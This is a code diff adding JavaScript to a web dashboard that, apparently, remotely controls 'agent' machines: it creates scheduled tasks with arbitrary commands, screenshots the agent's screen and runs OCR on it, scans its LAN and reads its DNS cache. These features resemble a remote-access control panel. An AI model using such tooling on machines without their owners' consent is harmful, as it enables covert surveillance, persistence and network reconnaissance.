+  $("tsk-body").innerHTML=(d.tasks||[]).map(t=>`<tr><td style="font-weight:600">${esc(t.name)}</td><td>${esc(t.status||"")}</td><td style="font-size:.72rem;white-space:nowrap">${esc(t.next_run||"")}</td><td style="font-size:.72rem;white-space:nowrap">${esc(t.last_run||"")}</td><td><button class="act-btn danger" onclick="if(!confirm('Delete?'))return;socket.emit('delete_scheduled_task',{name:'${t.name.replace(/'/g,"\\'").replace(/</g,'&lt;')}',_target:agent})">Del</button></td></tr>`).join("")||'<tr><td colspan="5" style="text-align:center;color:var(--text3);padding:30px">No tasks found</td></tr>';
+});
+$("tsk-create").addEventListener("click",()=>{
+  if(!agent)return;
+  socket.emit("create_scheduled_task",{name:$("tsk-n").value,command:$("tsk-cmd").value,schedule:$("tsk-sched").value,time:$("tsk-time").value,_target:agent});
+});
+socket.on("create_scheduled_task_result",d=>{toast(d.ok?"Task created":"Failed: "+(d.error||"?"),d.ok?"ok":"err");if(d.ok&&agent)socket.emit("get_scheduled_tasks",{_target:agent})});
+socket.on("delete_scheduled_task_result",d=>{toast(d.ok?"Task deleted":"Failed: "+(d.error||"?"),d.ok?"ok":"err");if(d.ok&&agent)socket.emit("get_scheduled_tasks",{_target:agent})});
+
+/* ── OCR ─────────────────────────────────────────────────── */
+$("ocr-run").addEventListener("click",()=>{if(!agent)return;$("ocr-status").textContent="Capturing & running OCR...";$("ocr-out").value="";socket.emit("ocr_screenshot",{_target:agent})});
+socket.on("ocr_result",d=>{if(d.error){$("ocr-status").textContent="Error: "+d.error;return}$("ocr-status").textContent="Done — "+((d.text||"").length)+" chars";$("ocr-out").value=d.text||""});
+
+/* ── LAN Scan ────────────────────────────────────────────── */
+$("lan-scan").addEventListener("click",()=>{if(!agent)return;$("lan-body").innerHTML='<tr><td colspan="3" style="text-align:center;color:var(--text3);padding:30px">Scanning...</td></tr>';socket.emit("lan_scan",{_target:agent})});
+socket.on("lan_scan_result",d=>{
+  if(d.error){$("lan-body").innerHTML=`<tr><td colspan="3" style="color:var(--red);text-align:center;padding:30px">${esc(d.error)}</td></tr>`;return}
+  $("lan-body").innerHTML=(d.hosts||[]).map(h=>`<tr><td style="font-family:monospace">${esc(h.ip)}</td><td style="font-family:monospace">${esc(h.mac||"")}</td><td>${esc(h.iface||"")}</td></tr>`).join("")||'<tr><td colspan="3" style="text-align:center;color:var(--text3);padding:30px">No hosts found</td></tr>';
+});
+
+/* ── DNS Cache ───────────────────────────────────────────── */
+let _dns=[];
+$("dns-fetch").addEventListener("click",()=>{if(!agent)return;$("dns-body").innerHTML='<tr><td colspan="2" style="text-align:center;color:var(--text3);padding:30px">Loading...</td></tr>';socket.emit("get_dns_cache",{_target:agent})});
+socket.on("dns_cache_result",d=>{
+  if(d.error){$("dns-body").innerHTML=`<tr><td colspan="2" style="color:var(--red);text-align:center;padding:30px">${esc(d.error)}</td></tr>`;return}
+  _dns=d.entries||[];renderDns();
+});
+$("dns-q").addEventListener("input",renderDns);
+function renderDns(){
+  const q=$("dns-q").value.toLowerCase();
+  const list=q?_dns.filter(e=>(e.name||"").toLowerCase().includes(q)||(e.ip||"").toLowerCase().includes(q)):_dns;
+  $("dns-body").innerHTML=list.map(e=>`<tr><td style="font-family:monospace">${esc(e.name)}</td><td style="font-family:monospace;color:var(--accent2)">${esc(e.ip||"")}</td></tr>`).join("")||'<tr><td colspan="2" style="text-align:center;color:var(--text3);padding:30px">No results</td></tr>';
+}
 
 /* ── Theme toggle ───────────────────────────────────────── */
 (function(){
